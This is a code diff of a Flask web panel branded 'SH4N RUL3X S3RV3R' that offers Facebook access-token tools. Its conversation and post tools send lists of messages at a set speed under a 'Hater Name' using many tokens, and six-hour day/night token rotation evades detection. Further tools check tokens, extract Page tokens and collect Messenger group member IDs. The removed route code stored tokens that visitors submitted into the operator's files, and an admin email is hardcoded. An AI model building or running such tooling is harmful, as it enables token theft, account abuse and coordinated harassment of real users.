@@ -5,11 +5,10 @@ import uuid
 import os
 import json
 from threading import Lock
-from typing import List, Dict, Any
-import re
+from typing import List, Dict, Any # Added for new tool
 
 app = Flask(__name__)
-app.secret_key = os.urandom(24)
+app.secret_key = os.urandom(24)  # Secret key for session management
 
 # Admin credentials
 ADMIN_USERNAME = "thewstones57@gmail.com"
@@ -20,18 +19,19 @@ stop_events = {}
 task_logs = {}
 token_usage_stats = {}
 task_types = {}
-user_tasks = {}
-data_lock = Lock()
+user_tasks = {} # Associates tasks with usernames
+data_lock = Lock()  # Lock for thread-safe operations
 
 # Multi-token system storage
-user_day_tokens = {}
-user_night_tokens = {}
-token_rotation_start_time = {}
+user_day_tokens = {}  # {username: [tokens]}
+user_night_tokens = {}  # {username: [tokens]}
+token_rotation_start_time = {}  # {username: datetime}
 
 # User data file
 USERS_FILE = 'users.json'
 
 def load_users():
+    """Load users from JSON file"""
     if os.path.exists(USERS_FILE):
         try:
             with open(USERS_FILE, 'r') as f:
@@ -41,38 +41,33 @@ def load_users():
     return {}
 
 def save_users(users):
+    """Save users to JSON file"""
     with open(USERS_FILE, 'w') as f:
         json.dump(users, f, indent=2)
 
 def save_user_tokens(username, tokens):
+    """Save tokens to a file named after the username"""
     filename = f"{username}.txt"
     with open(filename, 'w') as f:
         for token in tokens:
             f.write(f"{token}\n")
 
 def save_user_day_tokens(username, tokens):
+    """Save day tokens to a file named after the username"""
     filename = f"{username}_day.txt"
     with open(filename, 'w') as f:
         for token in tokens:
             f.write(f"{token}\n")
 
 def save_user_night_tokens(username, tokens):
+    """Save night tokens to a file named after the username"""
     filename = f"{username}_night.txt"
     with open(filename, 'w') as f:
         for token in tokens:
             f.write(f"{token}\n")
 
-def load_user_tokens(username):
-    filename = f"{username}.txt"
-    if os.path.exists(filename):
-        try:
-            with open(filename, 'r') as f:
-                return [line.strip() for line in f.readlines() if line.strip()]
-        except:
-            return []
-    return []
-
 def load_user_day_tokens(username):
+    """Load day tokens from file"""
     filename = f"{username}_day.txt"
     if os.path.exists(filename):
         try:
@@ -83,6 +78,7 @@ def load_user_day_tokens(username):
     return []
 
 def load_user_night_tokens(username):
+    """Load night tokens from file"""
     filename = f"{username}_night.txt"
     if os.path.exists(filename):
         try:
@@ -93,8 +89,10 @@ def load_user_night_tokens(username):
     return []
 
 def load_user_all_tokens(username):
+    """Load all tokens from user files (regular, day, night)"""
     all_tokens = []
     
+    # Load regular tokens
     filename = f"{username}.txt"
     if os.path.exists(filename):
         try:
@@ -103,6 +101,7 @@ def load_user_all_tokens(username):
         except:
             pass
     
+    # Load day tokens
     day_filename = f"{username}_day.txt"
     if os.path.exists(day_filename):
         try:
@@ -111,6 +110,7 @@ def load_user_all_tokens(username):
         except:
             pass
     
+    # Load night tokens
     night_filename = f"{username}_night.txt"
     if os.path.exists(night_filename):
         try:
@@ -119,6 +119,7 @@ def load_user_all_tokens(username):
         except:
             pass
     
+    # Remove duplicates while preserving order
     seen = set()
     unique_tokens = []
     for token in all_tokens:
@@ -129,38 +130,47 @@ def load_user_all_tokens(username):
     return unique_tokens
 
 def get_current_token_set(username):
+    """Get current active token set based on time (6-hour day/night rotation)"""
     current_time = datetime.now()
     
+    # Check if rotation has started for this user
     if username not in token_rotation_start_time:
         token_rotation_start_time[username] = current_time
         return user_day_tokens.get(username, [])
     
+    # Calculate elapsed time since rotation started
     start_time = token_rotation_start_time[username]
     elapsed_hours = (current_time - start_time).total_seconds() / 3600
     
+    # Determine if we should use day or night tokens (6-hour intervals)
     cycle_position = int(elapsed_hours // 6) % 2
     
     if cycle_position == 0:
+        # Day tokens (first 6 hours of each 12-hour cycle)
         return user_day_tokens.get(username, [])
     else:
+        # Night tokens (second 6 hours of each 12-hour cycle)
         return user_night_tokens.get(username, [])
 
 def add_log(task_id, log_message):
     with data_lock:
         if task_id not in task_logs:
             task_logs[task_id] = []
+        # Keep only logs from the last 30 minutes
         cutoff_time = datetime.now() - timedelta(minutes=30)
         task_logs[task_id] = [log for log in task_logs[task_id] if log['time'] > cutoff_time]
+        # Add new log with timestamp
         task_logs[task_id].append({'time': datetime.now(), 'message': log_message})
 
 # =================================================================================
-# NEW TOOL: Page Tokens Gen
+# NEW TOOL: Page Tokens Gen (from pasted_content_2.txt)
 # =================================================================================
 
 PAGE_TOKEN_BASE_URL = "https://graph.facebook.com/v17.0/me/accounts"
 PAGE_TOKEN_FIELDS = "name,id,access_token"
 
 def mask_token(t: str) -> str:
+    """Masks the token for display."""
     if not t:
         return "<empty>"
     if len(t) <= 12:
@@ -168,6 +178,7 @@ def mask_token(t: str) -> str:
     return t[:6] + "..." + t[-6:]
 
 def fetch_pages(user_token: str) -> List[Dict[str, Any]]:
+    """Fetches pages associated with the user token."""
     params = {"fields": PAGE_TOKEN_FIELDS, "access_token": user_token}
     url = PAGE_TOKEN_BASE_URL
     pages: List[Dict[str, Any]] = []
@@ -198,6 +209,8 @@ def fetch_pages(user_token: str) -> List[Dict[str, Any]]:
     return pages
 
 def process_token_for_web(user_token: str) -> str:
+    """Processes the token and returns an HTML string of the results."""
+    
     if not user_token:
         return "<p class='error'>Error: No token provided.</p>"
 
@@ -237,6 +250,18 @@ PAGE_TOKEN_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook Pages Token Extractor</title>
     <style>
+        .token-detail {
+            margin-bottom: 10px;
+        }
+        .token-detail p {
+            margin: 5px 0;
+        }
+        .token-detail code {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+        /* Reusing the main app's background and font for consistency */
         body {
             background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
             background-size: cover;
@@ -263,6 +288,9 @@ PAGE_TOKEN_TEMPLATE = """
         h2 {
             color: #ffffff;
         }
+        p {
+            color: #ccc;
+        }
         form {
             background: rgba(255, 255, 255, 0.1);
             padding: 15px;
@@ -282,7 +310,7 @@ PAGE_TOKEN_TEMPLATE = """
             color: #333;
         }
         input[type="submit"] {
-            background-color: #007bff;
+            background-color: #007bff; /* Blue button for consistency */
             color: white;
             padding: 10px 15px;
             border: none;
@@ -294,31 +322,24 @@ PAGE_TOKEN_TEMPLATE = """
         input[type="submit"]:hover {
             background-color: #0056b3;
         }
-        .page-list {
-            margin-top: 20px;
-        }
         .page-card {
-            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.3);
             padding: 15px;
+            margin-top: 10px;
             border-radius: 5px;
-            margin-bottom: 10px;
-            border-left: 5px solid #28a745;
+            background-color: rgba(255, 255, 255, 0.1);
         }
         .page-card h3 {
+            color: #ffc107; /* Yellow for page name */
             margin-top: 0;
-            color: #28a745;
         }
-        .page-card p {
-            margin: 5px 0;
-            word-wrap: break-word;
-        }
-        .page-card code.token {
-            display: block;
-            padding: 5px;
-            background-color: rgba(0, 0, 0, 0.5);
-            color: #ffc107;
+        .token {
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 2px 5px;
             border-radius: 3px;
             font-size: 0.9em;
+            color: #28a745; /* Green for tokens */
+            word-break: break-all;
         }
         .error {
             color: #dc3545;
@@ -331,36 +352,33 @@ PAGE_TOKEN_TEMPLATE = """
         .back-btn {
             display: inline-block;
             margin-top: 20px;
-            padding: 10px 15px;
+            padding: 10px 20px;
             background-color: #6c757d;
             color: white;
             text-decoration: none;
-            border-radius: 4px;
+            border-radius: 5px;
             font-weight: bold;
-        }
-        .back-btn:hover {
-            background-color: #5a6268;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Facebook Pages Token Extractor</h1>
-        <form method="POST" action="/page-tokens-gen">
-            <div class="form-group">
-                <label for="user_token">User Access Token:</label>
-                <input type="text" id="user_token" name="user_token" required placeholder="Enter your Facebook User Access Token">
-            </div>
-            <input type="submit" value="Fetch Page Tokens">
+        <p>Enter your Facebook Token To Get Your Page Tokens</p>
+        
+        <form method="POST">
+            <label for="user_token"><strong>User Access Token:</strong></label>
+            <input type="text" id="user_token" name="user_token" placeholder="Paste Your Facebook To Get Pages tokens  here" required>
+            <input type="submit" value="Fetch Pages">
         </form>
         
-        {% if result_html %}
-            <div class="result-section">
-                {{ result_html | safe }}
-            </div>
+        {% if results_html %}
+            <hr style="border-color: rgba(255, 255, 255, 0.2);">
+            <h2>Extraction Results</h2>
+            {{ results_html | safe }}
         {% endif %}
         
-        <a href="/" class="back-btn">Back to Main</a>
+        <a href="/" class="back-btn">Back to Dashboard</a>
     </div>
 </body>
 </html>
@@ -368,24 +386,15 @@ PAGE_TOKEN_TEMPLATE = """
 
 @app.route("/page-tokens-gen", methods=["GET", "POST"])
 def page_tokens_gen():
-    if not session.get("logged_in") or not session.get("approved"):
-        return redirect(url_for("home"))
+    if 'username' not in session:
+        return redirect(url_for('login'))
     
-    result_html = None
+    results_html = None
     if request.method == "POST":
-        user_token = request.form.get("user_token")
+        user_token = request.form.get("user_token", "").strip()
+        results_html = process_token_for_web(user_token)
         
-        if user_token:
-            username = session["username"]
-            all_tokens = load_user_all_tokens(username)
-            
-            if user_token not in all_tokens:
-                all_tokens.append(user_token)
-                save_user_tokens(username, all_tokens)
-        
-        result_html = process_token_for_web(user_token)
-        
-    return render_template_string(PAGE_TOKEN_TEMPLATE, result_html=result_html)
+    return render_template_string(PAGE_TOKEN_TEMPLATE, results_html=results_html)
 
 # =================================================================================
 # END NEW TOOL
@@ -399,6 +408,17 @@ SIGNUP_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign Up</title>
     <style>
+        .token-detail {
+            margin-bottom: 10px;
+        }
+        .token-detail p {
+            margin: 5px 0;
+        }
+        .token-detail code {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
         body {
             background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
             background-size: cover;
@@ -452,7 +472,7 @@ SIGNUP_TEMPLATE = """
             transition: background-color 0.3s;
         }
         .signup-btn:hover {
-            background-color: #1e7e34;
+            background-color: #218838;
         }
         .error-message {
             color: #dc3545;
@@ -511,6 +531,17 @@ LOGIN_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login</title>
     <style>
+        .token-detail {
+            margin-bottom: 10px;
+        }
+        .token-detail p {
+            margin: 5px 0;
+        }
+        .token-detail code {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
         body {
             background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
             background-size: cover;
@@ -623,6 +654,17 @@ ADMIN_LOGIN_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Login</title>
     <style>
+        .token-detail {
+            margin-bottom: 10px;
+        }
+        .token-detail p {
+            margin: 5px 0;
+        }
+        .token-detail code {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
         body {
             background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
             background-size: cover;
@@ -724,8 +766,16 @@ HTML_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SH4N RUL3X S3RV3R</title>
     <style>
-        * {
-            box-sizing: border-box;
+        .token-detail {
+            margin-bottom: 10px;
+        }
+        .token-detail p {
+            margin: 5px 0;
+        }
+        .token-detail code {
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 2px 4px;
+            border-radius: 3px;
         }
         body {
             background-image: url('https://i.ibb.co/gM0phW6S/1614b9d2afdbe2d3a184f109085c488f.jpg');
@@ -735,65 +785,26 @@ HTML_TEMPLATE = """
             color: #ffffff;
             font-family: 'Roboto', sans-serif;
             margin: 0;
-            padding: 10px;
+            padding: 20px;
         }
         h1 {
             color: #ffffff;
             text-align: center;
             margin-top: 0;
-            padding-top: 10px;
+            padding-top: 20px;
             text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
-            font-size: 1.5rem;
         }
         .content {
-            max-width: 100%;
+            max-width: 900px;
             margin: 0 auto;
-            padding: 15px;
+            padding: 20px;
             background-color: rgba(0, 0, 0, 0.7);
             border-radius: 10px;
             box-shadow: 0 2px 10px rgba(0,0,0,0.5);
         }
-        .tools-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 10px;
-            margin: 20px 0;
-        }
-        .tool-card {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            padding: 15px;
-            text-align: center;
-            border: 2px solid #007bff;
-            transition: transform 0.3s;
-        }
-        .tool-card:hover {
-            transform: translateY(-2px);
-        }
-        .tool-img {
-            width: 60px;
-            height: 60px;
-            object-fit: cover;
-            border-radius: 50%;
-            margin-bottom: 8px;
-            border: 2px solid #007bff;
-        }
-        .tool-btn {
-            display: block;
-            padding: 8px;
-            background-color: #007bff;
-            color: white;
-            text-decoration: none;
-            border-radius: 4px;
-            font-weight: bold;
-            font-size: 0.9rem;
-        }
-        .tool-btn:hover {
-            background-color: #0056b3;
-        }
         .section {
-            margin-top: 20px;
-            padding: 15px;
+            margin-top: 30px;
+            padding: 20px;
             background-color: rgba(0, 0, 0, 0.5);
             border-radius: 8px;
             border-left: 4px solid #007bff;
@@ -802,431 +813,531 @@ HTML_TEMPLATE = """
             color: #ffffff;
             margin-top: 0;
             border-bottom: 1px solid rgba(255, 255, 255, 0.2);
-            padding-bottom: 8px;
+            padding-bottom: 10px;
         }
         .form-group {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         .form-label {
             color: #ffffff;
             display: block;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
             font-weight: 500;
         }
         .form-control {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             background-color: rgba(255, 255, 255, 0.9);
             color: #495057;
             border: 1px solid #ced4da;
             border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
         }
         .btn {
-            display: inline-block;
-            padding: 10px 15px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-weight: bold;
-            text-align: center;
-            text-decoration: none;
-            transition: background-color 0.3s ease;
+            padding: 12px;
+            margin-top: 10px;
             border: none;
-            font-size: 0.9rem;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 16px;
+            width: 100%;
+        }
+        .btn:hover {
+            opacity: 0.9;
         }
         .btn-primary {
             background-color: #007bff;
             color: white;
         }
-        .btn-primary:hover {
-            background-color: #0056b3;
+        .btn-secondary {
+            background-color: #6c757d;
+            color: white;
         }
         .btn-danger {
             background-color: #dc3545;
             color: white;
         }
-        .btn-danger:hover {
-            background-color: #c82333;
+        .btn-success {
+            background-color: #28a745;
+            color: white;
+        }
+        .btn-warning {
+            background-color: #ffc107;
+            color: black;
         }
         .logout-btn {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            padding: 6px 12px;
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            padding: 8px 15px;
             background-color: #dc3545;
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 0.8rem;
-            z-index: 1000;
         }
-        .user-info {
-            position: fixed;
-            top: 10px;
-            left: 10px;
-            padding: 6px 12px;
-            background-color: rgba(0, 123, 255, 0.7);
-            color: white;
+        textarea {
+            min-height: 100px;
+        }
+        .task-item {
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 15px;
+            margin-bottom: 15px;
             border-radius: 5px;
-            font-size: 0.8rem;
-            z-index: 1000;
+            border-left: 4px solid #6f42c1;
+        }
+        .task-actions {
+            display: flex;
+            margin-top: 10px;
+        }
+        .task-actions .btn {
+            width: auto;
+            flex: 1;
+        }
+        .nav-tabs {
+            display: flex;
+            list-style: none;
+            padding: 0;
+            margin: 0 0 20px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .nav-tabs li {
+            margin-right: 10px;
+        }
+        .nav-tabs a {
+            display: block;
+            padding: 10px 15px;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: white;
+            text-decoration: none;
+            border-radius: 5px 5px 0 0;
+        }
+        /* User Request: Stylish Pink Home Button */
+        .nav-tabs li:first-child a {
+            background-color: #ff69b4; /* Pink color */
+            color: white;
+            font-size: 1.1em;
+            padding: 12px 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+            border: 2px solid #ff1493; /* Deep Pink border */
+        }
+        .nav-tabs li:first-child a:hover {
+            background-color: #ff1493; /* Deep Pink on hover */
+            transform: translateY(-2px);
+            box-shadow: 0 6px 8px rgba(0, 0, 0, 0.4);
+        }
+        .nav-tabs li:first-child a.active {
+            background-color: #ff1493; /* Deep Pink when active */
+            border: 2px solid #ffffff;
+        }
+        .nav-tabs a.active {
+            background-color: rgba(0, 123, 255, 0.7);
+            font-weight: bold;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .tool-section {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .tool-btn {
+            display: inline-block;
+            padding: 15px 30px;
+            margin: 10px;
+            background-color: rgba(255, 165, 0, 0.7);
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        .tool-btn:hover {
+            background-color: rgba(255, 140, 0, 0.9);
+            transform: scale(1.05);
+        }
+        .tool-img {
+            max-width: 100%;
+            border-radius: 5px;
+            margin-bottom: 10px;
+            max-height: 200px;
+            object-fit: cover;
+            /* User Request: Red border on tool images */
+            border: 3px solid red;
+        }
+        .developer-section {
+            margin-top: 30px;
+            padding: 20px;
+            background-color: rgba(0, 0, 0, 0.5);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .developer-btn {
+            display: inline-block;
+            padding: 10px 20px;
+            margin-top: 10px;
+            background-color: #4267B2;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
         }
         .pending-approval {
             background-color: rgba(255, 193, 7, 0.3);
-            padding: 12px;
+            padding: 15px;
             border-radius: 5px;
-            margin: 10px 0;
+            margin: 15px 0;
             text-align: center;
             border-left: 4px solid #ffc107;
         }
         .approved {
             background-color: rgba(40, 167, 69, 0.3);
-            padding: 12px;
+            padding: 15px;
             border-radius: 5px;
-            margin: 10px 0;
+            margin: 15px 0;
             text-align: center;
             border-left: 4px solid #28a745;
         }
-        .task-list {
-            list-style-type: none;
-            padding: 0;
-        }
-        .task-item {
-            background-color: rgba(255, 255, 255, 0.1);
-            padding: 12px;
-            margin-bottom: 8px;
-            border-radius: 5px;
-            border-left: 5px solid #ffc107;
-        }
-        .task-item p {
-            margin: 0;
-            font-size: 0.9rem;
-        }
-        .task-actions {
-            margin-top: 8px;
-        }
-        .task-actions a, .task-actions button {
-            margin-right: 5px;
-            font-size: 0.8rem;
-        }
-        .developer-section {
-            margin-top: 20px;
-            padding: 15px;
-            background-color: rgba(0, 0, 0, 0.5);
-            border-radius: 8px;
-            text-align: center;
-            border-top: 4px solid #28a745;
-        }
-        .developer-section h3 {
-            color: #28a745;
-            margin-top: 0;
-        }
-        .developer-btn {
-            display: inline-block;
+        .user-info {
+            position: absolute;
+            top: 20px;
+            left: 20px;
             padding: 8px 15px;
-            background-color: #28a745;
+            background-color: rgba(0, 123, 255, 0.7);
             color: white;
-            text-decoration: none;
-            border-radius: 4px;
-            font-weight: bold;
-            margin-top: 8px;
-            font-size: 0.9rem;
-        }
-        .developer-btn:hover {
-            background-color: #1e7e34;
-        }
-        textarea {
-            width: 100%;
-            min-height: 120px;
-            padding: 10px;
             border-radius: 5px;
-            background-color: rgba(255, 255, 255, 0.9);
-            color: #333;
-            border: 1px solid #ccc;
-            font-family: monospace;
-            font-size: 0.9rem;
+            font-size: 14px;
         }
-        .token-result {
-            background-color: rgba(255, 255, 255, 0.1);
-            padding: 10px;
-            margin-bottom: 8px;
-            border-radius: 5px;
-            border-left: 4px solid;
-        }
-        .token-result.valid {
-            border-left-color: #28a745;
-        }
-        .token-result.invalid {
-            border-left-color: #dc3545;
-        }
-        .token-result p {
-            margin: 3px 0;
-            font-size: 0.9rem;
-        }
-        .profile-pic {
-            width: 50px;
-            height: 50px;
-            border-radius: 50%;
-            margin-right: 10px;
-            border: 2px solid #007bff;
-        }
-        .token-info {
-            display: flex;
-            align-items: center;
-            margin-bottom: 8px;
+
+        @media (max-width: 768px) {
+            .content {
+                padding: 15px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            .btn {
+                padding: 10px;
+            }
+            .user-info {
+                position: relative;
+                top: 0;
+                left: 0;
+                margin-bottom: 15px;
+            }
+            .logout-btn {
+                position: relative;
+                top: 0;
+                right: 0;
+                margin-bottom: 15px;
+            }
         }
     </style>
-</head>
-<body>
-    <div class="user-info">User: {{ session.get('username', 'Unknown') }}</div>
-    <button class="logout-btn" onclick="window.location.href='/logout'">Logout</button>
-    
-    <div class="content">
-        <h1>SH4N RUL3X S3RV3R</h1>
-        
-        {% if not session.get('approved') %}
-        <div class="pending-approval">
-            <h3>⏳ Pending Approval</h3>
-            <p>Your account is waiting for admin approval. Contact With Developer For Approval</p>
-        </div>
-        {% else %}
-        <div class="approved">
-            <h3>✅ YOU ARE APPROVED BY SH4N</h3>
-        </div>
-        {% endif %}
-        
-        <div class="tools-grid">
-            <div class="tool-card">
-                <img src="https://i.ibb.co/21PNHLpM/IMG-20251112-190843.jpg" alt="Convo Tool" class="tool-img">
-                <a href="#" class="tool-btn" onclick="showTool('conversations')">CONVO TOOL</a>
-            </div>
-            
-            <div class="tool-card">
-                <img src="https://i.ibb.co/Xrtwkrgf/IMG-20251112-191238.jpg" alt="Post Tool" class="tool-img">
-                <a href="#" class="tool-btn" onclick="showTool('posts')">POST TOOL</a>
-            </div>
-            
-            <div class="tool-card">
-                <img src="https://i.ibb.co/600SDM1y/IMG-20251112-191047.jpg" alt="Token Checker" class="tool-img">
-                <a href="#" class="tool-btn" onclick="showTool('token-checker')">TOKEN CHECKER</a>
-            </div>
-            
-            <div class="tool-card">
-                <img src="https://i.ibb.co/qF1DxtT1/IMG-20251112-191257.jpg" alt="Page Tokens Gen" class="tool-img">
-                <a href="/page-tokens-gen" class="tool-btn">FETCH PAGES</a>
-            </div>
-            
-            <div class="tool-card">
-                <img src="https://i.ibb.co/Ndr3nFWf/IMG-20251112-192608.jpg" alt="UID Fetcher" class="tool-img">
-                <a href="#" class="tool-btn" onclick="showTool('messenger-groups')">UID FETCHER</a>
-            </div>
-            
-            <div class="tool-card">
-                <img src="https://i.ibb.co/hFzVrWsQ/IMG-20251112-192643.jpg" alt="Task Manager" class="tool-img">
-                <a href="#" class="tool-btn" onclick="showTool('tasks')">TASK MANAGER</a>
-            </div>
-        </div>
-        
-        <!-- Conversations Tool -->
-        <div id="conversations" class="section" style="display: none;">
-            <h2 class="section-title">Conversation Task</h2>
-            {% if not session.get('approved') %}
-            <div class="pending-approval">
-                <p>❌ You need admin approval to use this tool</p>
-            </div>
-            {% else %}
-            <form method="POST" action="/start-task">
-                <input type="hidden" name="task_type" value="convo">
-                <div class="form-group">
-                    <label class="form-label">Tokens (one per line):</label>
-                    <textarea name="tokens" class="form-control" placeholder="Enter tokens, one per line" required></textarea>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Conversation ID:</label>
-                    <input type="text" name="convo" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Messages (one per line):</label>
-                    <textarea name="messages" class="form-control" placeholder="Enter messages, one per line" required></textarea>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Speed (seconds):</label>
-                    <input type="number" name="interval" class="form-control" value="5" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Hater Name:</label>
-                    <input type="text" name="haterName" class="form-control" required>
-                </div>
-                <button class="btn btn-primary" type="submit">Start Task</button>
-            </form>
-            {% endif %}
-        </div>
-        
-        <!-- Posts Tool -->
-        <div id="posts" class="section" style="display: none;">
-            <h2 class="section-title">Post Comment Task</h2>
-            {% if not session.get('approved') %}
-            <div class="pending-approval">
-                <p>❌ You need admin approval to use this tool</p>
-            </div>
-            {% else %}
-            <form method="POST" action="/start-task">
-                <input type="hidden" name="task_type" value="post">
-                <div class="form-group">
-                    <label class="form-label">Tokens (one per line):</label>
-                    <textarea name="tokens" class="form-control" placeholder="Enter tokens, one per line" required></textarea>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Post ID:</label>
-                    <input type="text" name="post" class="form-control" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Messages (one per line):</label>
-                    <textarea name="messages" class="form-control" placeholder="Enter messages, one per line" required></textarea>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Speed (seconds):</label>
-                    <input type="number" name="interval" class="form-control" value="5" required>
-                </div>
-                <div class="form-group">
-                    <label class="form-label">Hater Name:</label>
-                    <input type="text" name="haterName" class="form-control" required>
-                </div>
-                <button class="btn btn-primary" type="submit">Start Task</button>
-            </form>
-            {% endif %}
-        </div>
-        
-        <!-- Token Checker Tool -->
-        <div id="token-checker" class="section" style="display: none;">
-            <h2 class="section-title">Token Checker</h2>
-            {% if not session.get('approved') %}
-            <div class="pending-approval">
-                <p>❌ You need admin approval to use this tool</p>
-            </div>
-            {% else %}
-            <form method="POST" action="/check-token">
-                <div class="form-group">
-                    <label class="form-label">Tokens (one per line):</label>
-                    <textarea name="tokens" class="form-control" placeholder="Enter tokens to check, one per line" required></textarea>
-                </div>
-                <button class="btn btn-primary" type="submit">Check Tokens</button>
-            </form>
-            
-            {% if token_results %}
-            <div style="margin-top: 20px;">
-                <h3>Results:</h3>
-                {% for result in token_results %}
-                <div class="token-result {{ 'valid' if result.valid else 'invalid' }}">
-                    {% if result.valid %}
-                    <div class="token-info">
-                        {% if result.profile_pic %}
-                        <img src="{{ result.profile_pic }}" alt="Profile" class="profile-pic">
-                        {% endif %}
-                        <div>
-                            <p><strong>Name:</strong> {{ result.user_name }}</p>
-                            <p><strong>UID:</strong> {{ result.user_id }}</p>
-                            <p><strong>Token:</strong> {{ result.token[:20] }}...</p>
-                        </div>
-                    </div>
-                    {% else %}
-                    <p><strong>Token:</strong> {{ result.token }}</p>
-                    <p><strong>Status:</strong> ❌ Invalid</p>
-                    {% endif %}
-                </div>
-                {% endfor %}
-            </div>
-            {% endif %}
-            {% endif %}
-        </div>
-        
-        <!-- UID Fetcher Tool -->
-        <div id="messenger-groups" class="section" style="display: none;">
-            <h2 class="section-title">UID Fetcher</h2>
-            {% if not session.get('approved') %}
-            <div class="pending-approval">
-                <p>❌ You need admin approval to use this tool</p>
-            </div>
-            {% else %}
-            <form method="POST" action="/fetch-uids">
-                <div class="form-group">
-                    <label class="form-label">Token:</label>
-                    <input type="text" name="token" class="form-control" required placeholder="Enter a valid token">
-                </div>
-                <button class="btn btn-primary" type="submit">Fetch Messenger Groups</button>
-            </form>
-            
-            {% if group_results %}
-            <div style="margin-top: 20px;">
-                <h3>Messenger Groups:</h3>
-                {% for group in group_results %}
-                <div class="token-result valid">
-                    <p><strong>Group Name:</strong> {{ group.name }}</p>
-                    <p><strong>Thread ID:</strong> {{ group.id }}</p>
-                    <p><strong>Participants ({{ group.participants|length }}):</strong></p>
-                    <textarea readonly style="height: 100px; font-size: 0.8rem;">{{ group.participants | join('\n') }}</textarea>
-                </div>
-                {% endfor %}
-            </div>
-            {% endif %}
-            {% endif %}
-        </div>
-        
-        <!-- Task Manager -->
-        <div id="tasks" class="section" style="display: none;">
-            <h2 class="section-title">Active Tasks</h2>
-            {% if active_tasks %}
-            <ul class="task-list">
-                {% for task in active_tasks %}
-                <li class="task-item">
-                    <p><strong>ID:</strong> {{ task.id }} | <strong>Type:</strong> {{ task.type }}</p>
-                    <div class="task-actions">
-                        <a href="/logs/{{ task.id }}" class="btn btn-primary">View Logs</a>
-                        <form method="POST" action="/stop-task" style="display:inline;">
-                            <input type="hidden" name="task_id" value="{{ task.id }}">
-                            <button type="submit" class="btn btn-danger">Stop</button>
-                        </form>
-                    </div>
-                </li>
-                {% endfor %}
-            </ul>
-            {% else %}
-            <p>No active tasks.</p>
-            {% endif %}
-        </div>
-        
-        <div class="developer-section">
-            <h3>Developer</h3>
-            <img src="https://i.ibb.co/8nk328Bq/IMG-20251112-192830.jpg" alt="Developer" style="width: 80px; border-radius: 50%;">
-            <p>TH3 SH4N</p>
-            <a href="https://www.facebook.com/SH33T9N.BOII.ONIFR3" class="developer-btn" target="_blank">Facebook Profile</a>
-        </div>
-    </div>
-
     <script>
-        function showTool(toolName) {
-            // Hide all tools
-            var tools = document.querySelectorAll('.section');
-            tools.forEach(function(tool) {
-                tool.style.display = 'none';
-            });
-            
-            // Show selected tool
-            var selectedTool = document.getElementById(toolName);
-            if (selectedTool) {
-                selectedTool.style.display = 'block';
-                // Scroll to the tool
-                selectedTool.scrollIntoView({ behavior: 'smooth' });
+        function toggleTokenInput() {
+            var option = document.getElementById("tokenOption").value;
+            if (option === "single") {
+                document.getElementById("singleTokenGroup").style.display = "block";
+                document.getElementById("multiTokenGroup").style.display = "none";
+            } else if (option === "multi") {
+                document.getElementById("singleTokenGroup").style.display = "none";
+                document.getElementById("multiTokenGroup").style.display = "block";
             }
         }
         
-        // Auto-refresh tasks every 15 seconds if tasks section is visible
+        function togglePostTokenInput() {
+            var option = document.getElementById("postTokenOption").value;
+            if (option === "single") {
+                document.getElementById("postSingleTokenGroup").style.display = "block";
+                document.getElementById("postMultiTokenGroup").style.display = "none";
+                document.getElementById("postDayNightTokenGroup").style.display = "none";
+            } else if (option === "multi") {
